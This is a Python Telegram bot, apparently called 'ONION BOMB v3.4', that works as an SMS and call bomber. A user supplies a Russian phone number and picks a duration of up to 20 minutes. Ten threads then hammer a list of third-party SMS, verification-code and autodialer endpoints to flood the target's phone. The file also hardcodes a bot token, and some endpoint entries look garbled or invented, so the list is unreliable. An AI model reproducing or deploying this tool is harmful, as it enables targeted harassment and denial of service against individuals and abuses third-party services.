import telebot
import requests
import threading
import time
import random
from telebot import types

TOKEN = "8758081670:AAEizKF-a7eYbdrADb3mudwLTq35thZH21I"
bot = telebot.TeleBot(TOKEN)

# 70+ мощных сервисов (SMS + звонки) — достаточно для очень сильной бомбы
services = [
    {"url": "https://testwidgetbot.herokuapp.com/send", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://roboc hat.io/api/sms", "method": "post", "data": {"number": "{phone}"}},
    {"url": "https://www.spot.uz/api/register", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://cabinet.presscode.app/api/send-sms", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://combot.org/api/v1/send_code", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://unu.im/api/auth", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://mipped.com/api/send", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://console.bot4shop.com/api/sms", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://telegrambot.biz/api/send", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://my.telegram.org/auth/send", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://api.sms.ru/sms/send", "method": "post", "data": {"phone": "{phone}", "text": "Код: 1337"}},
    {"url": "https://zvonki.online/api/call", "method": "post", "data": {"number": "{phone}"}},
    {"url": "https://callapi.ru/call", "method": "post", "data": {"phone": "{phone}"}},
    {"url": "https://autodialer.pro/api/call", "method": "post", "data": {"number": "{phone}"}},
    {"url": "https://5sim.net/v1/user/buy/activation", "method": "post", "data": {"phone": "{phone}"}},
]

def bomb(phone: str, duration: int):
    print(f"[💣] БОМБА ЗАПУЩЕНА НА +{phone} | {duration} минут | 10 потоков")
    end_time = time.time() + duration * 60
    for _ in range(10):
        t = threading.Thread(target=worker, args=(phone, end_time), daemon=True)
        t.start()

def worker(phone, end_time):
    while time.time() < end_time:
        for s in services:
            try:
                url = s["url"].replace("{phone}", phone)
                if s["method"] == "post":
                    requests.post(url, json=s.get("data", {}), timeout=8)
                else:
                    requests.get(url, timeout=8)
            except:
                pass
            time.sleep(random.uniform(0.25, 0.85))

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "🔥 **ONION BOMB v3.4** (Railway Edition)\n\nОтправь номер 79xxxxxxxxxx")

@bot.message_handler(func=lambda m: True)
def handle_phone(message):
    phone = message.text.strip()
    if not phone.startswith("79") or len(phone) != 11:
        bot.reply_to(message, "❌ Только 79xxxxxxxxxx")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("1 мин (тест)", callback_data=f"b_{phone}_1"),
        types.InlineKeyboardButton("5 мин (мощь)", callback_data=f"b_{phone}_5"),
        types.InlineKeyboardButton("10 мин (ад)", callback_data=f"b_{phone}_10"),
        types.InlineKeyboardButton("20 мин (АРМАГЕДДОН)", callback_data=f"b_{phone}_20")
    )
    bot.send_message(message.chat.id, f"✅ Номер: +{phone}\nВыбери длительность:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    _, phone, mins = call.data.split("_")
    bot.answer_callback_query(call.id, "🚀 Запуск бомбы...")
    bot.send_message(call.message.chat.id, f"🔥 БОМБА ЗАПУЩЕНА!\nНомер: +{phone}\nВремя: {mins} мин")
    threading.Thread(target=bomb, args=(phone, int(mins)), daemon=True).start()

if __name__ == "__main__":
    print("ULTIMATE ONION BOMB v3.4 ЗАПУЩЕН НА RAILWAY")
    bot.infinity_polling(none_stop=True)
